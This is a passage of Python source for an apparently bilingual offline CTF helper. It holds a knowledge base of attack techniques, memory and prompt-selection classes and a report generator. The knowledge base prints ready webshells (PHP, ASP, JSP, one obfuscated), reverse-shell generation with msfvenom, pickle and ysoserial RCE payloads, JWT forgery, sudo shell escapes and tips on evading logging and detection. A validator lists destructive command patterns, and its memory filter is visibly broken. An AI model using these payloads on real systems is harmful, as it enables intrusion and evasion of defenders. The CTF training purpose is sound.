            "Pattern for offset: cyclic 200 | ./binary; cyclic -l OFFSET_VALUE",
            "GDB: gdb ./binary; run; info registers rsp; x/100wx $rsp",
            "Control EIP: overflow with offset + target address",
            "Find JMP ESP: objdump -d binary | grep jmp; or ROPgadget --binary binary | grep jmp",
            "Generate shellcode: msfvenom -p linux/x86/shell_reverse_tcp LHOST=IP LPORT=PORT -b '\\x00' -f python",
            "Ret2libc: find system() and '/bin/sh' addresses with: readelf -s /lib32/libc.so.6 | grep system; strings -a tx /lib32/libc.so.6 | grep /bin/sh",
        ],
        "tools": ["gdb", "objdump", "python", "python3", "msfvenom", "checksec", "readelf", "nm"],
        "tips_en": "Always identify all protections first with checksec. If ASLR is off, ret2libc is straightforward. If NX is off, you can execute shellcode on the stack. If both are on, you need ROP chains. Use pwntools for reliable exploit development.",
        "tips_pt": "Semverifique todas as proteções primeiro com checksec. Se ASLR está desligado, ret2libc é simples. Se NX está desligado, você pode executar shellcode na stack. Se ambos estão ligados, precisa de cadeias ROP.",
    },
    {
        "id": "priv_esc_linux",
        "patterns": [r"\bpriv(?:ilege)?\s*esc(?:alat)?\b", r"\broot\b.*\bget\b", r"\bsudo\b.*\bexploit\b", r"\bsuid\b", r"\b_linpeas\b", r"\blinenum\b", r"\bcapabilities\b", r"\bcron\b.*\bwrite\b"],
        "category": "Privilege Escalation - Linux",
        "techniques": [
            "Automated: ./linpeas.sh or ./linenum.sh",
            "SUID binaries: find / -perm -4000 -type f 2>/dev/null",
            "Sudo -l: sudo -l (check for misconfigured commands)",
            "Sudo exploit: sudo -u root /usr/bin/vim -c ':!/bin/sh'",
            "Capabilities: getcap -r / 2>/dev/null (look for cap_setuid+ep)",
            "Cron jobs: cat /etc/crontab; ls -la /etc/cron.d/",
            "Writable paths in PATH: echo $PATH; check each directory for write permissions",
            "Kernel exploits: uname -a; searchsploit linux kernel VERSION",
        ],
        "tools": ["linpeas", "linenum", "find", "getcap", "sudo", "searchsploit"],
        "tips_en": "LinPEAS is the most comprehensive automated tool. Always check SUID binaries first - GTFOBins has exploit paths for many. For sudo misconfigurations, check if you can use sudoedit, or abuse wildcard commands. Kernel exploits should be last resort.",
        "tips_pt": "LinPEAS é a ferramenta automatizada mais completa. Semverifique binários SUID primeiro - GTFOBins tem caminhos de exploração para muitos. Para misconfigurações sudo, verifique sudoedit ou comandos com wildcard.",
    },
    {
        "id": "recon",
        "patterns": [r"\brecon(?:naissance)?\b", r"\bnmap\b", r"\bport\s+scan\b", r"\benum(?:eration)?\b", r"\bgobuster\b", r"\bdirb\b", r"\bferoxbuster\b", r"\bdirsearch\b", r"\bserv(?:ice)?\s+enum\b"],
        "category": "Reconnaissance",
        "techniques": [
            "Full port scan: nmap -p- -T4 TARGET",
            "Service detection: nmap -sC -sV -T4 TARGET",
            "UDP scan: nmap -sU --top-ports 100 TARGET",
            "Vuln scan: nmap --script vuln TARGET",
            "Dir busting: gobuster dir -u http://TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html",
            "Feroxbuster: feroxbuster -u http://TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
            "Vhost discovery: gobuster vhost -u http://TARGET -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
            "DNS enum: dig axfr TARGET @ns1.TARGET or dnsrecon -d TARGET",
        ],
        "tools": ["nmap", "gobuster", "feroxbuster", "dirb", "dirsearch", "dig", "nslookup"],
        "tips_en": "Start with a full port scan - services on non-standard ports are often the entry point. After nmap, immediately do directory busting on discovered web services. Save all output to files for reference.",
        "tips_pt": "Comece com scan de portas completo - serviços em portas não-padronizadas são frequentemente o ponto de entrada. Após nmap, faça directory busting imediatamente nos serviços web descobertos.",
    },
    {
        "id": "webshell",
        "patterns": [r"\bwebshell\b", r"\bbackdoor\b.*\bphp\b", r"\bbackdoor\b.*\basp\b", r"\bbackdoor\b.*\bjsp\b", r"\bpersistent\s+access\b", r"\bmini\s+shell\b"],
        "category": "Web - Webshells",
        "techniques": [
            "PHP minimal: <?php system($_GET['c']); ?>",
            "PHP POST: <?php system($_POST['c']); ?>",
            "PHP one-liner: <?php echo shell_exec($_GET['c']); ?>",
            "PHP obfuscated: <?php $_=preg_replace('/./e','\\x65\\x76\\x61\\x6c(\\x62\\x61\\x73\\x65\\x36\\x34\\x5f\\x64\\x65\\x63\\x6f\\x64\\x65', '\\x63\\x68\\x72','\\x63\\x68\\x72'); ?>",
            "ASP: <%eval request(\"c\")%>",
            "JSP: <%Runtime.getRuntime().exec(request.getParameter(\"c\"));%>",
            "Use: curl 'http://TARGET/shell.php?c=id'",
        ],
        "tools": ["curl", "python", "python3"],
        "tips_en": "After uploading a webshell, verify it works before closing the upload vector. Use POST-based shells to avoid URL logging. Consider using encoded/obfuscated shells to avoid simple detection. Always note the shell URL for later access.",
        "tips_pt": "Após upload de webshell, verifique se funciona antes de fechar o vetor de upload. Use shells baseadas em POST para evitar logging em URL. Considere shells codificadas para evitar detecção simples.",
    },
    {
        "id": "vigenere",
        "patterns": [r"\bvigenere\b", r"\bvigenère\b", r"\bkeyed\s+cipher\b", r"\bpolyalphabetic\b"],
        "category": "Crypto - Vigenere",
        "techniques": [
            "Online tool: use dcode.fr Vigenere cipher tool",
            "Python: from vigenere import decrypt; decrypt(ciphertext, key) (install: pip install vigenere)",
            "Key length (Kasiski): find repeated sequences, measure distances between them, GCD gives key length",
            "Key length (IoC): calculate index of coincidence for each key length, correct length will match English IoC (~0.065)",
            "Known plaintext: if you know part of plaintext, XOR with ciphertext to recover key stream",
            "No key: try common keys like 'flag', 'key', 'secret', 'ctf'",
        ],
        "tools": ["python", "python3"],
        "tips_en": "Kasiski examination is the classic approach - find repeated 3+ character sequences and compute GCD of their distances. For short ciphertexts, try common short keys manually. The dcode.fr solver is very reliable.",
        "tips_pt": "Exame de Kasiski é a abordagem clássica - encontre sequências repetidas de 3+ caracteres e calcule o MDC das distâncias. Para ciphertexts curtos, tente chaves comuns manualmente.",
    },
    {
        "id": "morse_code",
        "patterns": [r"\bmorse\b", r"\b\.\s*-\s*", r"\b\-\s*\.\s*", r"\bdit\s*dah\b", r"\b\.\.\.\s*\-\-\-\s*\.\.\.\b"],
        "category": "Misc - Morse Code",
        "techniques": [
            "Online: https://morsecode.world/international/decoder.html",
            "Python: install morsecode package and use decode function",
            "Manual: .- = A, -... = B, -.-. = C, -.. = D, . = E, ..-. = F, etc.",
            "Check separator: spaces between letters, slashes (/) between words",
            "Reverse: sometimes encode your answer to verify",
        ],
        "tools": ["python", "python3"],
        "tips_en": "Watch for multiple formats: dots and dashes, 1s and 0s (1=dot, 0=dash or vice versa), long and short beeps. The separator between letters and words varies - inspect the pattern carefully.",
        "tips_pt": "Observe múltiplos formatos: pontos e traços, 1s e 0s, beeps longos e curtos. O separador entre letras e palavras varia - inspecione o padrão cuidadosamente.",
    },
    {
        "id": "binary_hex_convert",
        "patterns": [r"\bbinary\b.*\bconvert\b", r"\bhex\b.*\bconvert\b", r"\b0[xX][0-9a-fA-F]+\b", r"\b[01]{8,}\b", r"\boctal\b.*\bconvert\b", r"\bascii\b.*\bconvert\b"],
        "category": "Misc - Encoding Conversion",
        "techniques": [
            "Hex to ASCII: echo '48656C6C6F' | xxd -r -p",
            "Hex to ASCII Python: bytes.fromhex('48656C6C6F').decode()",
            "Binary to ASCII: echo '01001000' | xxd -r -b",
            "ASCII to hex: echo -n 'Hello' | xxd -p",
            "ASCII to binary: echo -n 'Hello' | xxd -b",
            "Octal to ASCII: python3 -c \"print(bytes([int(x,8) for x in '110 145 154 154 157'.split()]).decode())\"",
            "Decimal to ASCII: python3 -c \"print(''.join(chr(x) for x in [72,101,108,108,111]))\"",
            "CyberChef: use 'Magic' auto-detect or specific 'From Hex', 'From Binary' recipes",
        ],
        "tools": ["xxd", "python", "python3"],
        "tips_en": "When you see long strings of hex, binary, or octal, conversion is almost always the first step. Check if the output looks like another encoding that needs further decoding. CyberChef's Magic function auto-detects many encodings.",
        "tips_pt": "Quando ver strings longas de hex, binário ou octal, conversão é quase sempre o primeiro passo. Verifique se a saída parece outra codificação que precisa de mais decodificação.",
    },
    {
        "id": "smb_enum",
        "patterns": [r"\bsmb\b", r"\bsamba\b", r"\b445\b.*\bport\b", r"\bshare\b.*\benum\b", r"\bsmbclient\b", r"\brpcclient\b", r"\benum4linux\b"],
        "category": "Post-Exploitation - SMB",
        "techniques": [
            "List shares: smbclient -L //TARGET -N",
            "Connect to share: smbclient //TARGET/share -N",
            "Null session: smbclient -L //TARGET -U '' -N",
            "Enum4linux: enum4linux -a TARGET",
            "Enum4linux-ng: enum4linux-ng -A TARGET",
            "RPC client: rpcclient -U '' TARGET; then enumdomusers, enumdomgroups, querydispinfo",
            "Mount share: mount -t cifs //TARGET/share /mnt/share -o guest",
            "Impacket: impacket-smbclient TARGET -no-pass",
        ],
        "tools": ["smbclient", "rpcclient", "enum4linux", "enum4linux-ng", "impacket-smbclient"],
        "tips_en": "Always try null/guest authentication first. Check for readable shares - they often contain sensitive files, passwords, or backup configs. If you find credentials, try them across all services.",
        "tips_pt": "Semverifique autenticação null/guest primeiro. Verifique shares legíveis - frequentemente contêm arquivos sensíveis, senhas ou configs de backup. Se encontrar credenciais, tente em todos os serviços.",
    },
    {
        "id": "deserialization",
        "patterns": [r"\bdeseriali[zs]\b", r"\bpickle\b.*\bexploit\b", r"\bjava.*\bserial\b", r"\byso\b", r"\bphp.*\bunserialize\b", r"\b__reduce__\b"],
        "category": "Web - Deserialization",
        "techniques": [
            "Python pickle: class Exploit(object): def __reduce__(self): return (os.system, ('id',)) then pickle.dumps(Exploit())",
            "PHP unserialize: check for magic methods __wakeup, __destruct, __toString",
            "Java: use ysoserial to generate payloads: java -jar ysoserial.jar CommonsCollections1 'id' | base64",
            "Detect: look for base64 encoded strings that decode to O: (PHP) or rO0AB (Java) or pickle opcodes",
            "PHP gadget chains: PHPGGC -b monolog/rce1 system 'id'",
            "Test: replace serialized data with your payload in cookies, POST data, or headers",
        ],
        "tools": ["python", "python3", "curl", "burpsuite"],
        "tips_en": "Deserialization vulnerabilities are critical (RCE). For PHP, identify the framework/library to find correct gadget chain. For Java, ysoserial covers many libraries. For Python pickle, __reduce__ is the key method.",
        "tips_pt": "Vulnerabilidades de desserialização são críticas (RCE). Para PHP, identifique o framework/biblioteca para encontrar a gadget chain correta. Para Java, ysoserial cobre muitas bibliotecas.",
    },
    {
        "id": "jwt",
        "patterns": [r"\bjwt\b", r"\bjson\s+web\s+token\b", r"\beyJ\b", r"\btoken\b.*\bmanipulat\b", r"\bnone\s+algorithm\b"],
        "category": "Web - JWT",
        "techniques": [
            "Decode JWT: split by '.', base64 decode each part (header.payload.signature)",
            "Python decode: python3 -c \"import base64,json; print(json.loads(base64.urlsafe_b64decode('PART'+'=='))))\"",
            "None algorithm: change header to {\"alg\":\"none\",\"typ\":\"JWT\"}, remove signature",
            "JWT tool: python3 jwt_tool.py TOKEN -e (exploit mode)",
            "Crack secret: hashcat -m 16500 jwt.txt rockyou.txt",
            "John crack: john jwt.txt --format=HMAC-SHA256 --wordlist=rockyou.txt",
            "RSA key swap: if algorithm is RS256, change to HS256 and use public key as HMAC secret",
            "Forge with jwt_tool: python3 jwt_tool.py TOKEN -T -pk public.pem",
        ],
        "tools": ["jwt_tool", "hashcat", "john", "python", "python3", "curl"],
        "tips_en": "JWT has three parts separated by dots. The signature is not encryption - anyone can read the payload. Check if 'none' algorithm is accepted. For RS256->HS256 attack, you need the public key.",
        "tips_pt": "JWT tem três partes separadas por pontos. A assinatura não é criptografia - qualquer um pode ler o payload. Verifique se algoritmo 'none' é aceito. Para ataque RS256->HS256, precisa da chave pública.",
    },
]

_KNOWLEDGE_BASE = []
for _entry in _KB_RAW:
    _compiled = [re.compile(p, re.IGNORECASE) for p in _entry["patterns"]]
    _validated_tools = [t for t in _entry["tools"] if t in _VALID_TOOLS]
    _KNOWLEDGE_BASE.append({
        "id": _entry["id"],
        "compiled_patterns": _compiled,
        "category": _entry["category"],
        "techniques": _entry["techniques"],
        "tools": _validated_tools,
        "tips_en": _entry.get("tips_en", ""),
        "tips_pt": _entry.get("tips_pt", ""),
    })

_OFFLINE_HEADER_EN = "[Offline Mode] Ollama is not running. Here is verified guidance from my knowledge base."
_OFFLINE_HEADER_PT = "[Modo Offline] Ollama não está em execução. Aqui está orientação verificada da minha base de conhecimento."
_OFFLINE_CATEGORY_EN = "Detected category: {cat}"
_OFFLINE_CATEGORY_PT = "Categoria detectada: {cat}"
_OFFLINE_TECHNIQUES_EN = "Verified techniques:"
_OFFLINE_TECHNIQUES_PT = "Técnicas verificadas:"
_OFFLINE_TOOLS_EN = "Relevant tools: {tools}"
_OFFLINE_TOOLS_PT = "Ferramentas relevantes: {tools}"
_OFFLINE_TIPS_EN = "Note: {tip}"
_OFFLINE_TIPS_PT = "Nota: {tip}"
_OFFLINE_MEMORY_EN = "From similar past analyses:"
_OFFLINE_MEMORY_PT = "De análises passadas similares:"
_OFFLINE_MEMORY_ITEM_EN = "Previous query: {q}\nPrevious approach: {r}"
_OFFLINE_MEMORY_ITEM_PT = "Consulta anterior: {q}\nAbordagem anterior: {r}"
_OFFLINE_NO_MATCH_EN = "[Offline Mode] Ollama is not running and I could not match your query to my verified knowledge base. Try starting Ollama with 'ollama serve' or rephrase your query with specific CTF terms like 'SQL injection', 'base64 decode', 'privilege escalation', 'steganography', etc."
_OFFLINE_NO_MATCH_PT = "[Modo Offline] Ollama não está em execução e não consegui associar sua consulta à minha base de conhecimento verificada. Tente iniciar o Ollama com 'ollama serve' ou reformule sua consulta com termos CTF específicos."
_OFFLINE_FOOTER_EN = "For comprehensive analysis, start Ollama: ollama serve"
_OFFLINE_FOOTER_PT = "Para análise completa, inicie o Ollama: ollama serve"
_OFFLINE_MEMORY_DISCLAIMER_EN = "(Past analysis from memory - verify commands before executing)"
_OFFLINE_MEMORY_DISCLAIMER_PT = "(Análise anterior da memória - verifique comandos antes de executar)"


def _ensure_data_dir():
    os.makedirs(_DATA_DIR, mode=0o700, exist_ok=True)


def _sanitise(text: str) -> str:
    text = text.strip()
    text = re.sub(r"\*{1,2}(.+?)\*{1,2}", r"\1", text, flags=re.DOTALL)
    text = re.sub(r"#{1,6}\s?", "", text)
    text = re.sub(r"`{1,3}(.+?)`{1,3}", r"\1", text, flags=re.DOTALL)
    text = re.sub(r"\n{3,}", "\n\n", text)
    text = html.escape(text)
    return text.strip()


def _sanitise_input(text: str) -> str:
    text = text.strip()[:_MAX_INPUT_LENGTH]
    text = re.sub(r"[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]", "", text)
    return text


def _detect_language(text: str):
    if _LANG_DETECT_PT.search(text):
        return _LANG_PT
    if _LANG_DETECT_EN.search(text):
        return _LANG_EN
    return None


def _deterministic_embedding(text: str, dim: int = _EMBEDDING_DIMENSION) -> List[float]:
    h = hashlib.sha512(text.encode("utf-8", errors="replace")).digest()
    embedding = []
    for i in range(dim):
        byte_idx = (i * 4) % len(h)
        chunk = h[byte_idx:byte_idx + 4]
        val = int.from_bytes(chunk, "big", signed=True) / 2147483648.0
        embedding.append(max(-1.0, min(1.0, val)))
    return embedding


def _cosine_similarity(a: List[float], b: List[float]) -> float:
    if len(a) != len(b) or len(a) == 0:
        return 0.0
    dot = sum(x * y for x, y in zip(a, b))
    norm_a = math.sqrt(sum(x * x for x in a))
    norm_b = math.sqrt(sum(x * x for x in b))
    if norm_a < 1e-9 or norm_b < 1e-9:
        return 0.0
    return dot / (norm_a * norm_b)


def _extract_commands(text: str) -> List[str]:
    pattern = r"(?:^|\n)\s*\$?\s*([a-zA-Z][a-zA-Z0-9_-]{1,30})(?:\s|$)"
    return [m.group(1).lower() for m in re.finditer(pattern, text)]


def _validate_tools_in_response(text: str) -> Tuple[bool, List[str]]:
    commands = _extract_commands(text)
    invalid = []
    for cmd in commands:
        base_cmd = cmd.split("-")[0].split("_")[0]
        if base_cmd not in _VALID_TOOLS and len(base_cmd) > 1:
            invalid.append(cmd)
    return len(invalid) == 0, invalid


def _validate_memory_text(text: str) -> str:
    lines = text.split("\n")
    filtered = []
    for line in lines:
        cmds = _extract_commands(line)
        all_valid = all(c.split("-")[0].split("_")[0] in _VALID_TOOLS or len(c) <= 1 for c in cmds)
        filtered.append(line)
    return "\n".join(filtered)


@dataclass
class PromptCandidate:
    id: str
    content: str
    selection_count: int = 0
    total_reward: float = 0.0
    created_at: float = field(default_factory=time.time)

    def ucb1_score(self, total_selections: int, c: float = _UCB_EXPLORATION_CONSTANT) -> float:
        if self.selection_count == 0:
            return float("inf")
        exploitation = self.total_reward / self.selection_count
        exploration = c * math.sqrt(math.log(max(1, total_selections)) / self.selection_count)
        return exploitation + exploration

    def to_dict(self) -> dict:
        return {
            "id": self.id,
            "content": self.content,
            "selection_count": self.selection_count,
            "total_reward": self.total_reward,
            "created_at": self.created_at,
        }

    @classmethod
    def from_dict(cls, d: dict) -> "PromptCandidate":
        return cls(
            id=d["id"],
            content=d["content"],
            selection_count=d.get("selection_count", 0),
            total_reward=d.get("total_reward", 0.0),
            created_at=d.get("created_at", time.time()),
        )


class EpisodicMemoryStore:
    def __init__(self, db_path: str = _DB_PATH):
        self._db_path = db_path
        self._lock = threading.Lock()
        self._init_db()

    def _init_db(self):
        _ensure_data_dir()
        with self._lock:
            try:
                conn = sqlite3.connect(self._db_path, timeout=30)
                c = conn.cursor()
                c.execute(
                    "CREATE TABLE IF NOT EXISTS episodes ("
                    "id TEXT PRIMARY KEY, "
                    "query_hash TEXT NOT NULL, "
                    "query TEXT NOT NULL, "
                    "response TEXT NOT NULL, "
                    "prompt_id TEXT NOT NULL, "
                    "reward REAL DEFAULT 0.0, "
                    "timestamp REAL NOT NULL, "
                    "embedding TEXT NOT NULL, "
                    "category TEXT, "
                    "tools_used TEXT, "
                    "is_offline INTEGER DEFAULT 0"
                    ")"
                )
                c.execute("CREATE INDEX IF NOT EXISTS idx_query_hash ON episodes(query_hash)")
                c.execute("CREATE INDEX IF NOT EXISTS idx_timestamp ON episodes(timestamp)")
                conn.commit()
                conn.close()
            except sqlite3.Error:
                pass

    def store(
        self,
        query: str,
        response: str,
        prompt_id: str,
        embedding: List[float],
        category: str = "",
        tools_used: List[str] = None,
        is_offline: bool = False,
    ) -> str:
        episode_id = hashlib.sha256(
            f"{query}{time.time()}{threading.get_ident()}".encode()
        ).hexdigest()[:16]
        query_hash = hashlib.sha256(query.encode("utf-8", errors="replace")).hexdigest()
        embedding_json = json.dumps(embedding)
        tools_json = json.dumps(tools_used or [])

        with self._lock:
            try:
                conn = sqlite3.connect(self._db_path, timeout=30)
                c = conn.cursor()
                c.execute(
                    "INSERT OR REPLACE INTO episodes VALUES (?,?,?,?,?,?,?,?,?,?,?)",
                    (
                        episode_id,
                        query_hash,
                        query,
                        response,
                        prompt_id,
                        0.0,
                        time.time(),
                        embedding_json,
                        category,
                        tools_json,
                        1 if is_offline else 0,
                    ),
                )
                conn.commit()
                conn.close()
            except sqlite3.Error:
                pass

        return episode_id

    def retrieve_similar(self, query: str, limit: int = _MEMORY_RETRIEVAL_COUNT) -> List[Dict[str, Any]]:
        embedding = _deterministic_embedding(query)
        results = []

        with self._lock:
            try:
                conn = sqlite3.connect(self._db_path, timeout=30)
                c = conn.cursor()
                c.execute(
                    "SELECT id, query, response, embedding, category, tools_used, is_offline FROM episodes ORDER BY timestamp DESC LIMIT 500"
                )
                rows = c.fetchall()
                conn.close()
            except sqlite3.Error:
                return []

        for row in rows:
            try:
                stored_embedding = json.loads(row[3])
                sim = _cosine_similarity(embedding, stored_embedding)
                if sim >= _MEMORY_SIMILARITY_THRESHOLD:
                    tools = json.loads(row[5]) if row[5] else []
                    results.append({
                        "id": row[0],
                        "query": row[1],
                        "response": row[2],
                        "similarity": sim,
                        "category": row[4],
                        "tools_used": tools,
                        "is_offline": bool(row[6]),
                    })
            except (json.JSONDecodeError, IndexError, TypeError):
                continue

        results.sort(key=lambda x: x["similarity"], reverse=True)
        return results[:limit]

    def update_reward(self, episode_id: str, reward: float):
        with self._lock:
            try:
                conn = sqlite3.connect(self._db_path, timeout=30)
                c = conn.cursor()
                c.execute("UPDATE episodes SET reward = ? WHERE id = ?", (reward, episode_id))
                conn.commit()
                conn.close()
            except sqlite3.Error:
                pass

    def get_recent_episodes(self, limit: int = 50) -> List[Dict[str, Any]]:
        with self._lock:
            try:
                conn = sqlite3.connect(self._db_path, timeout=30)
                c = conn.cursor()
                c.execute(
                    "SELECT id, query, response, prompt_id, reward, timestamp, category, tools_used, is_offline FROM episodes ORDER BY timestamp DESC LIMIT ?",
                    (limit,),
                )
                rows = c.fetchall()
                conn.close()
                return [
                    {
                        "id": r[0],
                        "query": r[1],
                        "response": r[2],
                        "prompt_id": r[3],
                        "reward": r[4],
                        "timestamp": r[5],
                        "category": r[6],
                        "tools_used": json.loads(r[7]) if r[7] else [],
                        "is_offline": bool(r[8]),
                    }
                    for r in rows
                ]
            except sqlite3.Error:
                return []


class PromptManager:
    def __init__(self):
        self._lock = threading.Lock()
        self._prompts: Dict[str, PromptCandidate] = {}
        self._total_selections = 0
        self._analysis_count = 0
        self._load_prompts()

    def _load_prompts(self):
        _ensure_data_dir()
        if os.path.exists(_PROMPTS_PATH):
            try:
                with open(_PROMPTS_PATH, "r", encoding="utf-8") as f:
                    data = json.load(f)
                for pd in data.get("prompts", []):
                    p = PromptCandidate.from_dict(pd)
                    self._prompts[p.id] = p
                    self._total_selections += p.selection_count
                self._analysis_count = data.get("analysis_count", 0)
                return
            except (json.JSONDecodeError, KeyError, TypeError, IOError):
                pass

        for i, content in enumerate(_INITIAL_CTF_PROMPTS):
            pid = f"prompt_{i}_{hashlib.md5(content.encode()).hexdigest()[:8]}"
            self._prompts[pid] = PromptCandidate(id=pid, content=content)
        self._save_prompts()

    def _save_prompts(self):
        _ensure_data_dir()
        try:
            data = {
                "prompts": [p.to_dict() for p in self._prompts.values()],
                "analysis_count": self._analysis_count,
            }
            tmp_path = _PROMPTS_PATH + ".tmp"
            with open(tmp_path, "w", encoding="utf-8") as f:
                json.dump(data, f, ensure_ascii=False, indent=2)
            os.replace(tmp_path, _PROMPTS_PATH)
            os.chmod(_PROMPTS_PATH, 0o600)
        except (IOError, OSError):
            pass

    def select_prompt(self) -> PromptCandidate:
        with self._lock:
            if not self._prompts:
                pid = f"prompt_fallback_{int(time.time())}"
                p = PromptCandidate(id=pid, content=_INITIAL_CTF_PROMPTS[0])
                self._prompts[pid] = p

            best_prompt = None
            best_score = float("-inf")

            for p in self._prompts.values():
                score = p.ucb1_score(self._total_selections)
                if score > best_score:
                    best_score = score
                    best_prompt = p

            best_prompt.selection_count += 1
            self._total_selections += 1
            self._save_prompts()
            return best_prompt

    def record_reward(self, prompt_id: str, reward: float):
        with self._lock:
            if prompt_id in self._prompts:
                self._prompts[prompt_id].total_reward += reward
                self._save_prompts()

    def record_analysis(self):
        with self._lock:
            self._analysis_count += 1
            should_evolve = (
                self._analysis_count >= _APE_EVOLUTION_INTERVAL
                and len(self._prompts) >= _APE_MIN_PROMPTS
            )
            self._save_prompts()
            return should_evolve

    def evolve_prompts(self):
        with self._lock:
            if len(self._prompts) <= _APE_MIN_PROMPTS:
                return

            sorted_prompts = sorted(
                self._prompts.values(),
                key=lambda p: p.ucb1_score(self._total_selections),
            )
            worst = sorted_prompts[0]
            best = sorted_prompts[-1]

            try:
                mid_point = len(best.content) // 3
                base = best.content[:mid_point]
                end_phrase = "Focus on clear, actionable steps with verified commands only."
                new_content = f"{base} Take an alternative approach. {end_phrase}"
                new_content = new_content[:1000]
            except Exception:
                return

            if new_content and len(new_content) > 50:
                new_id = f"prompt_evo_{int(time.time())}_{hashlib.md5(new_content.encode()).hexdigest()[:8]}"
                self._prompts[new_id] = PromptCandidate(id=new_id, content=new_content)

                if len(self._prompts) > _APE_MAX_PROMPTS:
                    del self._prompts[worst.id]

                self._analysis_count = 0
                self._save_prompts()

    def get_stats(self) -> Dict[str, Any]:
        with self._lock:
            total = sum(p.selection_count for p in self._prompts.values())
            total_reward = sum(p.total_reward for p in self._prompts.values())
            return {
                "total_prompts": len(self._prompts),
                "total_selections": total,
                "total_reward": total_reward,
                "analysis_count": self._analysis_count,
                "avg_reward": total_reward / max(1, total),
            }


class HallucinationValidator:
    def __init__(self):
        pass

    def validate(self, text: str) -> Tuple[bool, List[str]]:
        is_valid, invalid_tools = _validate_tools_in_response(text)
        warnings = []
        if invalid_tools:
            warnings.append(f"Potentially invalid tools referenced: {', '.join(invalid_tools[:5])}")

        suspicious_patterns = [
            (r"\b(apt-get install|pip install|npm install|gem install)\b", "Installation command detected"),
            (r"\b(sudo rm -rf /|chmod 777 /|> /dev/sda)\b", "Dangerous command pattern"),
        ]
        for pattern, msg in suspicious_patterns:
            if re.search(pattern, text, re.IGNORECASE):
                warnings.append(msg)

        return is_valid, warnings


class OfflineAnalysisEngine:
    def __init__(self, memory_store: EpisodicMemoryStore, validator: HallucinationValidator):
        self._memory = memory_store
        self._validator = validator

    def analyze(self, query: str, lang: str, similar_episodes: List[Dict]) -> str:
        matches = self._match_knowledge(query)
        if not matches and not similar_episodes:
            if lang == _LANG_PT:
                return _OFFLINE_NO_MATCH_PT
            return _OFFLINE_NO_MATCH_EN

        parts = []
        if lang == _LANG_PT:
            parts.append(_OFFLINE_HEADER_PT)
        else:
            parts.append(_OFFLINE_HEADER_EN)

        seen_categories = set()
        for match in matches[:_OFFLINE_MAX_MATCHES]:
            if match["category"] in seen_categories:
                continue
            seen_categories.add(match["category"])
            parts.append(self._format_match(match, lang))

        if similar_episodes:
            parts.append(self._format_memory(similar_episodes, lang))

        if lang == _LANG_PT:
            parts.append(_OFFLINE_FOOTER_PT)
        else:
            parts.append(_OFFLINE_FOOTER_EN)

        response = "\n\n".join(parts)
        return response

    def _match_knowledge(self, query: str) -> List[Dict[str, Any]]:
        query_lower = query.lower()
        scored_matches = []

        for entry in _KNOWLEDGE_BASE:
            score = 0
            for pattern in entry["compiled_patterns"]:
                found = pattern.findall(query_lower)
                if found:
                    score += len(found)

            if score > 0:
                scored_matches.append((score, entry))

        scored_matches.sort(key=lambda x: x[0], reverse=True)
        return [
            {
                "category": entry["category"],
                "techniques": entry["techniques"],
                "tools": entry["tools"],
                "tips_en": entry["tips_en"],
                "tips_pt": entry["tips_pt"],
                "score": score,
            }
            for score, entry in scored_matches
        ]

    def _format_match(self, match: Dict[str, Any], lang: str) -> str:
        parts = []

        if lang == _LANG_PT:
            parts.append(_OFFLINE_CATEGORY_PT.format(cat=match["category"]))
            parts.append(_OFFLINE_TECHNIQUES_PT)
        else:
            parts.append(_OFFLINE_CATEGORY_EN.format(cat=match["category"]))
            parts.append(_OFFLINE_TECHNIQUES_EN)

        for i, tech in enumerate(match["techniques"], 1):
            parts.append(f"{i}. {tech}")

        if match["tools"]:
            tools_str = ", ".join(match["tools"])
            if lang == _LANG_PT:
                parts.append(_OFFLINE_TOOLS_PT.format(tools=tools_str))
            else:
                parts.append(_OFFLINE_TOOLS_EN.format(tools=tools_str))

        tip = match["tips_pt"] if lang == _LANG_PT else match["tips_en"]
        if tip:
            if lang == _LANG_PT:
                parts.append(_OFFLINE_TIPS_PT.format(tip=tip))
            else:
                parts.append(_OFFLINE_TIPS_EN.format(tip=tip))

        return "\n".join(parts)

    def _format_memory(self, episodes: List[Dict], lang: str) -> str:
        parts = []
        if lang == _LANG_PT:
            parts.append(_OFFLINE_MEMORY_PT)
            parts.append(_OFFLINE_MEMORY_DISCLAIMER_PT)
        else:
            parts.append(_OFFLINE_MEMORY_EN)
            parts.append(_OFFLINE_MEMORY_DISCLAIMER_EN)

        for ep in episodes[:2]:
            safe_query = ep.get("query", "")[:300]
            safe_response = _validate_memory_text(ep.get("response", ""))[:500]
            if lang == _LANG_PT:
                parts.append(_OFFLINE_MEMORY_ITEM_PT.format(q=safe_query, r=safe_response))
            else:
                parts.append(_OFFLINE_MEMORY_ITEM_EN.format(q=safe_query, r=safe_response))

        return "\n".join(parts)


class ReportGenerator:
    def __init__(self, memory_store: EpisodicMemoryStore, prompt_manager: PromptManager):
        self._memory = memory_store
        self._prompts = prompt_manager

    def generate(
        self,
        current_query: str,
        current_response: str,
        similar_episodes: List[Dict],
        prompt_used: PromptCandidate,
        validation_result: Tuple[bool, List[str]],
        is_offline: bool,
        lang: str = _LANG_EN,
    ) -> str:
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
        is_valid, warnings = validation_result
        tools_used = list(set(_extract_commands(current_response)))
        valid_tools = [t for t in tools_used if t in _VALID_TOOLS]
        prompt_stats = self._prompts.get_stats()

        similar_section = ""
        if similar_episodes:
            similar_items = ""
            for ep in similar_episodes:
                ep_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(ep.get("timestamp", 0)))
                offline_badge = ' <span class="badge bg-secondary">Offline</span>' if ep.get("is_offline") else ""
                similar_items += f"""
                <div class="card mb-3">
                    <div class="card-header bg-secondary text-white d-flex justify-content-between">
                        <small>Similarity: {ep.get('similarity', 0):.2%}</small>
                        <small>{ep_time}{offline_badge}</small>
                    </div>
                    <div class="card-body">
                        <h6 class="card-subtitle mb-2 text-muted">Query</h6>
                        <p class="card-text">{self._esc(ep.get('query', ''))}</p>
                        <h6 class="card-subtitle mb-2 text-muted">Previous Analysis</h6>
                        <p class="card-text">{self._esc(ep.get('response', ''))}</p>
                    </div>
                </div>"""
            similar_section = f"""
            <div class="mt-4">
                <h4>Related Past Analyses</h4>
                {similar_items}
            </div>"""

        warnings_section = ""
        if warnings:
            warning_items = "".join(f'<li class="text-warning">{self._esc(w)}</li>' for w in warnings)
            warnings_section = f"""
